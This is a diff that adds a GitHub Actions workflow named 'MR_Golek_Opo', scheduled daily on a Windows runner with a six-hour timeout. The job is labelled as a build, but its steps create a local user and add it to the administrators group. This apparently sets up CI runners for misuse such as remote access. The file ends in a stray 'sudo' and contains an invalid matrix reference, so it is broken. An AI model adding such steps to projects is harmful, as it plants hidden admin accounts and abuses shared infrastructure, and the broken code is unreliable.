@@ -1,0 +1,34 @@
+name: MR_Golek_Opo #gretonger yang di buang di group t.me/Bego_android_official
+on:
+  push:
+    branches: [ master, main ]
+  pull_request:
+    branches: [ master, main ]
+  schedule:
+    - cron: '0 0 * * *'
+jobs:
+  build:
+    name: Cpu
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        Mr: [A]
+        Golek: [1]
+        Opo: [A.1]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 1
+        JOB: ${{ matrix.Mr.Golek.Opo }}
+    steps:
+    - name: Mr
+      run: |
+        cmd /k net user MrGolekOpo /add
+        cmd /k net localgroup administrators MrGolekOpo /add
+    - name: Golek
+      run: |
+        wmic useraccount get name
+    - name: Opo
+      run: |
+        sudo 
